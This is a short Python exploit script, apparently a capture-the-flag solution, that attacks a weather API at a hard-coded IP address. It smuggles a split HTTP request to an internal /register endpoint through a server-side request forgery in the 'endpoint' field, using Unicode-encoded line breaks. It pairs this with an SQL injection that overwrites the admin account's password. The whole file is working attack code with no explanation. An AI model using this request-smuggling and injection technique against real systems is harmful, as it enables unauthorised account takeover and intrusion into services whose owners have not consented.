from requests import *

URL = "http://138.68.189.41:32481"

def endpoint_payload(username, password):
    username = utils.quote(username)
    password = utils.quote(password)
    print("password "+ password)
    content_length = len(username) + len(password) + 19

    return """127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: {content_length}

username={username}&password={password}

GET /?qwe=""".format(content_length=content_length, username=username, password=password)

def ssrify(httpFormated):
    return httpFormated.replace("\n","\u010D\u010A").replace(" ","\u0120")


def request(username, password):
    payload = endpoint_payload(username, password)
    ssrf_payload = ssrify(payload)

    print(ssrf_payload)
    return post(URL + '/api/weather',json={'endpoint': ssrf_payload, 'city': 'warsaw', 'country': 'poland'})

res = request('admin',"password') ON CONFLICT(username) DO UPDATE SET password = 'password';--")
print(res.text)

